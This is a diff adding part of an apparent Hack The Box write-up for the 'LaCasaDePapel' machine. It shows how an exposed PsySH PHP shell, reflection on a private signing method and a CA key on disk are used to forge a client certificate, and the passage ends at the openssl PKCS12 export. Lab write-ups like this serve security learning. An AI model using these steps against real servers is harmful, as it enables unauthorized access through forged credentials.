@@ -19,3 +19,86 @@ Psy Shell v0.9.9 (PHP 7.2.10 â cli) by Justin Hileman
 ```
 
 This seems like a debugging cli for PHP
+
+Running ```ls``` on the cli gives us a listing of local variables. It returns:
+
+```
+Variables: $tokyo
+```
+
+Then running ```show $tokyo``` gives a code listing
+
+```
+  > 2| class Tokyo {
+    3| 	private function sign($caCert,$userCsr) {
+    4| 		$caKey = file_get_contents('/home/nairobi/ca.key');
+    5| 		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
+    6| 		openssl_x509_export($userCert, $userCertOut);
+    7| 		return $userCertOut;
+    8| 	}
+    9| }
+```
+An important bit off info is the file path ```/home/nairobi/ca.key```
+
+Running private PHP methods:
+
+```
+$x = new Tokyo();
+$reflector = new ReflectionObject($x);
+$method = $reflector->getMethod('sign');
+$method->setAccessible(true);
+
+```
+
+This will let us sign and create a user cert
+
+I navigated to the https endpoint and downloaded the CA cert for use in the algo
+
+We also need to make a User CSR **(Certificate Signing Request)**
+
+```
+openssl req -nodes -newkey rsa:2048 -keyout user.key -out user.csr -subj "O=La Casa De Papel/CN=lacasadepapel.htb"
+```
+
+By running this command:
+```
+echo $method->invoke($x, "-----BEGIN CERTIFICATE-----
+MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
+YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
+OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
+cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
+9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
+QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
+/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
+4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
+ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
+PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
+SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
+hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
+vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
+BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
+EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
+MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
+-----END CERTIFICATE-----
+", "-----BEGIN CERTIFICATE REQUEST-----
+MIICfDCCAWQCAQAwNzEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDEaMBgGA1UE
+AwwRbGFjYXNhZGVwYXBlbC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQCmUq+K7RExpveU8RRcxyzhHRDAhhub7cjBULLU+1frmHPEBxleJ5loqORE
+X1mGQdIlN2sksYFcvDNW2n7JExhSwKXw21bhyQdGQYg+7I1Y43IsEOZSf/xlOJRF
+6/FnHkXHRZTtJm30HJ6OpApTeVHjrowCganjIYAgotdG3C1gUYU9seu6tNeOil3A
+9ta99u3JYRWi884247SgupsurZ2TVheZ6OxoYBaEgFVv4trW6QgB8VJsEOg937Tu
+Tb+dTjsZa5EwjuzllUjRTk2veUJE0J+BWdFc9O5oBPhoF+Px8+3CTsKWBiKfRtyG
+uq8NTL4MfnjqBEdXvwc+kUpOi0x7AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEA
+dxTb62Dn0aBhksH/oJpoNomQlqj7hEsQestu6Za5FREyJJu6AiuYzGnLI89ZvlEv
+YMtvTErU60NIvVXZZcrNopXyuiceM8HPvEbIQFaOhh/iz62fNjAddOdIItjgAK5o
+EmiyDwgABBAFDHzP5hLZrhQ0YcrkZ0LwuVdsUgYjWo83HJkUtX64nMq+Yhdmvq2n
+LYCgyChmMmH66aEYAHWOZPONCTIq4tqmWGr9SPPTAt683OGqwWoxB0oHKkFtR6vu
+KfL6K9/P96nYpP4beXMkWZDduGO8V4ELSgAKWoGRtOBf7732H1oUvYeJgIbEEXzt
+6POSWQ380THZwsyRm6YyLg==
+-----END CERTIFICATE REQUEST-----");
+```
+
+It provides us with a signed certificate!
+
+
+openssl pkcs12 -export -inkey user.key -in signed.pem -out signed.p12
